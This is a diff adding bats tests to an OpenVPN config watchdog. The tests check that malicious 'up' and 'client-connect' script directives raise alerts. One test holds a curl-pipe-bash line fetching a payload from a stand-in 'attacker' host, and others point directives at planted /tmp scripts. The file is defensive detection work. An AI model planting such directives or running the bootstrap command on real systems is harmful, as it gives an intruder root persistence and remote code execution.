@@ -213,3 +213,49 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-openvpn -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no-auto-trust: openvpn-config-watchdog does NOT refresh baseline on suspicious-config detection — alert STAYS until operator updates)" {
+    # T1546 VPN-event root-exec persistence primitive — alert MUST
+    # persist across runs until operator explicitly re-baselines.
+    # Sister to nm-vpn-plugin, gss-mech, ld-preload, musl-ld-path —
+    # active-injection class never auto-trusts.
+    seed_benign
+    run_wd
+    printf 'client\ndev tun\nup /tmp/.x\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (client-connect script directive — server-side symmetric to up): writable-root → alert" {
+    # OpenVPN server uses client-connect (run per accepted client).
+    # Sister script directive — equally root-execution surface.
+    seed_benign
+    run_wd
+    printf 'server\ndev tun\nclient-connect /tmp/.attacker\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant in script directive): curl bootstrap → alert (sister to wget-pipe-sh axis)" {
+    # Attacker may swap wget for curl, sh for bash. Watchdog must
+    # catch both curl AND wget; both sh AND bash variants.
+    seed_benign
+    run_wd
+    printf 'client\ndev tun\nup "curl -fsSL http://attacker/p | bash"\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-config scan: a second .conf in same dir ALSO scanned — not just first .conf)" {
+    # OpenVPN dir may carry many client/server configs. A planted
+    # config alongside benign one MUST be flagged.
+    seed_benign
+    printf 'client\ndev tun\nup /tmp/.evil2\n' > "${VPND}/client2.conf"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
